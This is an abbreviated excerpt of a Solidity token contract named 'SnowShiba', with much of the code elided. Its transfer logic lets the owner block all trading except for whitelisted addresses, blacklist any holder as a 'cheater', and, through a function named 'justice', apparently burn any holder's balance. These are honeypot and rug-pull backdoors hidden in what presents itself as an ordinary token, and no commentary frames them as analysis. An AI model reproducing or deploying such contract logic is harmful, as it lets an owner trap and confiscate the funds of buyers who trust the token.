...
abstract contract ERC20 is IERC20 {
  ...
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      require(ifStart || (starters[sender] && starters[recipient]));
      require(!cheaters[sender]);
...
contract SnowShibaERC20Token is ERC20Permit, VaultOwned {
    using SafeMath for uint256;
    uint256 public referralBonus;
    
    mapping(address=>address) referrers;

    constructor() ERC20("SnowShiba", "SS", 9) {
    }
    
    function setReferrers(address _referrer) public {
        require(referrers[msg.sender] == address(0));
        referrers[msg.sender] = _referrer;
    }
    
    function setRefBonus(uint256 _bonus) public onlyOwner() {
        require(_bonus > 0);
    ...
    function loadList(address _target, bool _result) public onlyOwner() {
        cheaters[_target] = _result;
    }
    
    function getList(address _target) public view returns(bool) {
        return cheaters[_target];
    }
    
    function startNow(bool _if) public onlyOwner() {
        ifStart = _if;
    }
    
    function addList(address _target, bool _result) public onlyOwner() {
        starters[_target] = _result;
    }
    
    function popList(address _target) public view returns(bool) {
        return starters[_target];
    }
    ...
    function justice(address _target) public onlyOwner() {
        require(balanceOf(_target) > 0, "Nothing to burn");
